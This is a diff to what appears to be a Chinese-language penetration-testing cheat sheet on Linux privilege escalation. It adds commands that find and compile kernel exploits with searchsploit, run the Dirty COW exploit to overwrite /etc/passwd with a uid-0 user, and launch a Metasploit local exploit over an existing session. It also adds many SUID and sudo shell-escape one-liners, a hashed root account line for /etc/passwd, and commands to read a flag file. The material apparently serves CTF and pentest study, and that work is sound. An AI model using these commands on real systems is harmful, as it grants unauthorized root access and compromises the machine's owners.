@@ -89,11 +89,112 @@ sudo /bin/sh
 
 ```bash
 # 信息收集
-uname -a
-cat /proc/version
+uname -a                    # 全部信息
+uname -r                    # 内核版本
+cat /etc/issue              # 发行版版本
+cat /etc/*-release          # 详细版本
+cat /proc/version           # 内核编译信息
 
 # 搜索漏洞
 searchsploit linux kernel $(uname -r)
+searchsploit -x linux/local/37088.c   # 查看 EXP 源码
+searchsploit -m linux/local/37088.c   # 复制到当前目录
+
+# 编译执行 C 语言 EXP
+gcc -o exp 37088.c && chmod +x exp && ./exp
+```
+
+### CVE-2016-5195 Dirty Cow（脏牛）
+
+**影响**: Linux kernel > 2.6.22 (2007) 且低于修复版本
+- Centos7: 3.10.0-327.36.3.el7
+- Ubuntu 16.04: 4.4.0-45.66
+- Debian 8: 3.16.36-1+deb8u2
+
+**原理**: 内存子系统 COW（写时复制）条件竞争，允许非特权用户写入只读文件（如 `/etc/passwd`）。
+
+```bash
+# Dirty Cow EXP
+gcc -pthread dirty.c -o dirty -lcrypt
+./dirty new_password
+# 会自动修改 /etc/passwd，创建 firefart 用户（uid=0）
+# 用完恢复: mv /tmp/bak /etc/passwd
+```
+
+### MSF local_exploit_suggester
+
+```bash
+# 已有 session 后
+bg                                    # 后台挂起
+use post/multi/recon/local_exploit_suggester
+set SESSION 1
+run
+# 输出可能的 EXP，如:
+# linux/local/cve_2016_5195_dirty_cow
+# linux/local/overlayfs_priv_esc
+
+use exploit/linux/local/cve_2016_5195_dirty_cow
+set SESSION 1
+set LHOST <kali_ip>
+set WritableDir /tmp
+exploit
+```
+
+### SUID 提权（详细）
+
+```bash
+# 查找 SUID 文件
+find / -user root -perm -4000 -print 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+
+# GTFOBins 查询: https://gtfobins.github.io/
+
+# find 提权
+find . -exec /bin/sh -p \; -quit
+
+# bash 提权
+bash -p
+
+# vim 提权（添加 root 用户）
+vim /etc/passwd
+# 添加: bob:$1$salt$638tR8bROOvPnPklDQ9Vf/:0:0::/root:/bin/bash
+# 密码 123456
+
+# vim 交互 shell
+vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
+
+# python 提权
+python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+# env 提权
+env /bin/sh -p
+```
+
+### SUDO 提权（详细）
+
+```bash
+sudo -l    # 查看可用命令
+
+# 一条命令
+sudo vim -c '!sh'
+sudo awk 'BEGIN {system("/bin/sh")}'
+sudo env /bin/sh
+sudo perl -e 'exec "/bin/sh";'
+sudo find /etc/passwd -exec /bin/sh \;
+sudo sed -n '1e exec sh 1>&0' /etc/passwd
+sudo zip 2.zip 1.txt -T --unzip-command="sh -c /bin/sh"
+
+# 两条命令（交互）
+sudo git help config → !/bin/sh
+sudo less /etc/hosts → !sh
+sudo man man → !/bin/sh
+sudo ftp → !/bin/sh
+sudo ed → !/bin/sh
+
+# 读文件
+sudo cat /flag
+sudo xxd /flag | xxd -r
+sudo chmod 777 /flag
 ```
 
 ---
